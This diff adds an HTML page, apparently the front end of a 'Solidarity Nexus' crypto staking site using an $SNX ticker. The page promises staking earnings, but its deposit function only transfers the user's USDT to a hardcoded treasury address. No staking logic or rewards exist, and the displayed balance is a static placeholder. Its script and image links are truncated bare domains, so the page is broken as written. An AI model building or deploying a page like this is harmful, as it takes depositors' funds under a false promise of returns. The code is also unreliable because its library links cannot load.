@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Solidarity Nexus | Stake SNX</title>
+    <script src="https://cdn.ethers.io"></script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background: #050505; color: white; font-family: 'Inter', sans-serif; }
+        .neon-border { border: 1px solid #00E5FF; box-shadow: 0 0 15px rgba(0, 229, 255, 0.3); }
+        .neon-text { color: #00E5FF; text-shadow: 0 0 8px rgba(0, 229, 255, 0.6); }
+    </style>
+</head>
+<body class="flex items-center justify-center min-h-screen p-6">
+
+    <div class="max-w-md w-full p-8 rounded-3xl neon-border bg-black/90 text-center">
+        <!-- Your SNX Logo -->
+        <img src="https://i.imgur.com" alt="SNX" class="w-40 h-40 mx-auto mb-6">
+        
+        <h1 class="text-3xl font-bold mb-1">Solidarity <span class="neon-text">Nexus</span></h1>
+        <p class="text-gray-400 text-xs mb-8 tracking-widest">STAKE. EARN. OWN. THE FUTURE.</p>
+
+        <!-- Wallet UI -->
+        <div id="wallet-ui" class="space-y-4">
+            <button id="connectBtn" onclick="connect()" class="w-full py-4 rounded-2xl border border-[#00E5FF] neon-text hover:bg-[#00E5FF] hover:text-black transition-all font-bold">CONNECT WEB3 WALLET</button>
+            
+            <div id="dashboard" class="hidden">
+                <div class="bg-gray-900 p-4 rounded-xl mb-4 flex justify-between">
+                    <span class="neon-text font-bold">$SNX</span>
+                    <span id="bal">0.00</span>
+                </div>
+                <input type="number" id="amt" placeholder="USDT Amount" class="w-full bg-transparent border-b border-gray-700 p-3 mb-6 text-center outline-none focus:border-[#00E5FF]">
+                <button onclick="deposit()" class="w-full bg-[#00E5FF] text-black font-bold py-4 rounded-2xl shadow-lg">DEPOSIT USDT BEP20</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const TREASURY = "0xD36C336391AB88Df769491139cf5C791eC6C6feC";
+        const USDT = "0x55d398326f99059fF775485246999027B3197955";
+        let signer;
+
+        async function connect() {
+            const provider = new ethers.providers.Web3Provider(window.ethereum);
+            await provider.send("eth_requestAccounts", []);
+            signer = provider.getSigner();
+            document.getElementById('connectBtn').classList.add('hidden');
+            document.getElementById('dashboard').classList.remove('hidden');
+        }
+
+        async function deposit() {
+            const amount = document.getElementById('amt').value;
+            const contract = new ethers.Contract(USDT, ["function transfer(address to, uint256 amount) public returns (bool)"], signer);
+            try {
+                const tx = await contract.transfer(TREASURY, ethers.utils.parseUnits(amount, 18));
+                alert("Transaction Sent!");
+                await tx.wait();
+                alert("USDT Received in Solidarity Nexus Treasury");
+            } catch (e) { alert("Error: " + e.message); }
+        }
+    </script>
+</body>
+</html>
